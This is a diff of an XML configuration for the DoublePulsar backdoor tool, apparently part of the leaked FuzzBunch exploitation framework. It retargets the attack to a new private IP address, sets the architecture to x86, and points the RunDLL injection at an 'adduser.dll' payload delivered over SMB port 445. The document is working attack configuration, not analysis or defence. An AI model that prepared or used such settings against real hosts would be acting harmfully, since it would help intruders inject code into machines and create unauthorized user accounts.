@@ -5,7 +5,7 @@
       <value>60</value>
     </parameter>
     <parameter name="TargetIp" description="Target IP Address" type="IPv4" format="Scalar" valid="true">
-      <value>192.168.101.115</value>
+      <value>192.168.101.228</value>
     </parameter>
     <parameter name="TargetPort" description="Port used by the Double Pulsar back door" type="TcpPort" format="Scalar" valid="true">
       <default>445</default>
@@ -28,7 +28,7 @@
     </paramchoice>
     <paramchoice name="Architecture" description="Architecture of the target OS">
       <default>x86</default>
-      <value>x64</value>
+      <value>x86</value>
       <paramgroup name="x86" description="x86 32-bits"></paramgroup>
       <paramgroup name="x64" description="x64 64-bits"></paramgroup>
     </paramchoice>
@@ -41,7 +41,7 @@
       <paramgroup name="Ping" description="Test for presence of backdoor"></paramgroup>
       <paramgroup name="RunDLL" description="Use an APC to inject a DLL into a user mode process.">
         <parameter name="DllPayload" description="DLL to inject into user mode" type="LocalFile" format="Scalar" valid="true">
-          <value>D:\hack\adduser\rdp64.dll</value>
+          <value>./dlls/adduser.dll</value>
         </parameter>
         <parameter name="DllOrdinal" description="The exported ordinal number of the DLL being injected to call" type="U32" format="Scalar" valid="true">
           <default>1</default>
